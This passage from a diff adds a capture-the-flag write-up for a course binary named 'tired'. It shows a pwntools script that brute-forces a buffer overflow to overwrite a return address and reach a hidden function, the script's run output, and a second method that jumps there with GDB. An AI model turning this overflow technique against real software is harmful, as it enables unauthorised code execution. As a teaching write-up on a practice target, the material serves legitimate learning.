+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">b&quot;7&quot;</span>)</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>    <span class="co"># send the buffer overflow</span></span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;Uhh... Okay, let&#39;s hear your &#39;great&#39; idea... :/</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>    <span class="bu">buffer</span> <span class="op">=</span> <span class="st">b&quot;A&quot;</span><span class="op">*</span>i <span class="op">+</span> <span class="st">b&quot;</span><span class="ch">\x26\x92\x04\x08</span><span class="st">&quot;</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="bu">buffer</span>)</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="bu">buffer</span>)</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>    <span class="co"># exit makeMoves</span></span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;What should I do?</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">b&quot;8&quot;</span>)</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    ret <span class="op">=</span> p.recvall()</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a>    p.close()</span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>    <span class="co"># check if we&#39;ve found it</span></span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(ret)</span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="st">b&quot;unreachable&quot;</span> <span class="kw">in</span> ret:</span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;Found!&quot;</span>)</span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span></span></code></pre></div>
+<p>And running the script gave the following output:</p>
+<div class="sourceCode">
+<pre class="sourceCode term"><code class="sourceCode term"><span><span class="ex">$</span> python3 get.py
+</span><span>32
+</span><span>[+] Starting local process './tired': pid 5952
+</span><span>b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
+</span><span>[+] Receiving all data: Done (5B)
+</span><span>[*] Process './tired' stopped with exit code 0 (pid 5952)
+</span><span>b'BYE!\n'
+</span><span>36
+</span><span>[+] Starting local process './tired': pid 5955
+</span><span>b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
+</span><span>[+] Receiving all data: Done (5B)
+</span><span>[*] Process './tired' stopped with exit code 0 (pid 5955)
+</span><span>b'BYE!\n'
+</span><span>40
+</span><span>[+] Starting local process './tired': pid 5958
+</span><span>b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
+</span><span>[+] Receiving all data: Done (5B)
+</span><span>[*] Process './tired' stopped with exit code 0 (pid 5958)
+</span><span>b'BYE!\n'
+</span><span>44
+</span><span>[+] Starting local process './tired': pid 5961
+</span><span>b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
+</span><span>[+] Receiving all data: Done (5B)
+</span><span>[*] Process './tired' stopped with exit code 0 (pid 5961)
+</span><span>b'BYE!\n'
+</span><span>48
+</span><span>[+] Starting local process './tired': pid 5964
+</span><span>b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
+</span><span>[+] Receiving all data: Done (5B)
+</span><span>[*] Process './tired' stopped with exit code -4 (SIGILL) (pid 5964)
+</span><span>b'BYE!\n'
+</span><span>52
+</span><span>[+] Starting local process './tired': pid 5968
+</span><span>b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x92\x04\x08'
+</span><span>[+] Receiving all data: Done (418B)
+</span><span>[*] Process './tired' stopped with exit code 0 (pid 5968)
+</span><span>b"BYE!\nIf you're seeing this, the code is in what I thought was an unreachable state.\nI could give you advice for what to do. But honestly, why should you trust me?\nI clearly screwed this up. I'm writing a message that should never appear, yet I know it will probably appear someday.\nOn a deep level, I know I'm not up to this task. [of keeping secrets]\nCOMP6841{REDACTED}b1VhrxhLBl6tDEn0Q7SJXFs6uVwASuV4u"
+</span><span>Found!
+</span></code></pre>
+</div>
+<p>I’m not entirely sure what the <code>"b1VhrxhLBl6tDEn0Q7SJXFs6uVwASuV4u"</code> is at the end. It’s not base64, and it’s not a youtube URL either. But either way, we got our flag :)</p>
+<h2 id="approach-2-gdb-jump">Approach 2: GDB Jump</h2>
+<p>That was alot of effort, but luckily we can skip most of this. GDB has a nice feature that allows us to jump to any address, simply by using the <code>jump</code> command. In this case, we can just jump straight to the relevant function:</p>
+<div class="sourceCode">
+<pre class="sourceCode term"><code class="sourceCode term"><span><span class="ex">$</span> gdb tired
+</span><span>GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+</span><span>Copyright (C) 2020 Free Software Foundation, Inc.
+</span><span>License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+</span><span>This is free software: you are free to change and redistribute it.
+</span><span>There is NO WARRANTY, to the extent permitted by law.
+</span><span>Type "show copying" and "show warranty" for details.
+</span><span>This GDB was configured as "x86_64-linux-gnu".
+</span><span>Type "show configuration" for configuration details.
+</span><span>For bug reporting instructions, please see:
+</span><span><http://www.gnu.org/software/gdb/bugs/>.
+</span><span>Find the GDB manual and other documentation resources online at:
+</span><span>    <http://www.gnu.org/software/gdb/documentation/>.
+</span><span>
+</span><span>For help, type "help".
+</span><span>Type "apropos word" to search for commands related to "word"...
+</span><span>Reading symbols from tired...
+</span><span>(No debugging symbols found in tired)
+</span><span>(gdb) break makeMoves
+</span><span>Breakpoint 1 at 0x80493d2
+</span><span>(gdb) run
+</span><span>Starting program: /home/ubuntu/tutor_ctf/tired/tired
+</span><span>
+</span><span>Breakpoint 1, 0x080493d2 in makeMoves ()
+</span><span>(gdb) jump unreachable
+</span><span>Continuing at 0x804922a.
+</span><span>If you're seeing this, the code is in what I thought was an unreachable state.
+</span><span>I could give you advice for what to do. But honestly, why should you trust me?
+</span><span>I clearly screwed this up. I'm writing a message that should never appear, yet I know it will probably appear someday.
+</span><span>On a deep level, I know I'm not up to this task. [of keeping secrets]
+</span><span>COMP6841{REDACTED}b1VhrxhLBl6tDEn0Q7SJXFs6uVwASuV4u[Inferior 1 (process 6060) exited normally]
+</span><span>(gdb)
+</span></code></pre>
+</div>
+<p>And there’s the flag!</p>
+<p>This method is nice, but does rely on a few things:</p>
+<ol type="1">
+<li>The <code>unreachable()</code> function does not have any checks for things that you had to do in <code>makeMoves()</code></li>
+<li>That you know the address of <code>unreachable()</code> in the first place. Some executables can strip away all function names and addresses, making it much harder to know exactly where to jump to.</li>
+<li>If this challenge instead required us to <code>netcat</code> to a server, we wouldn’t have the opportunity to run <code>gdb</code> in the first place. Hence, we’d have to resort to the buffer overflow method.</li>
+</ol>
+<p>So it’s definitely worth learning both in future CTFs.</p>
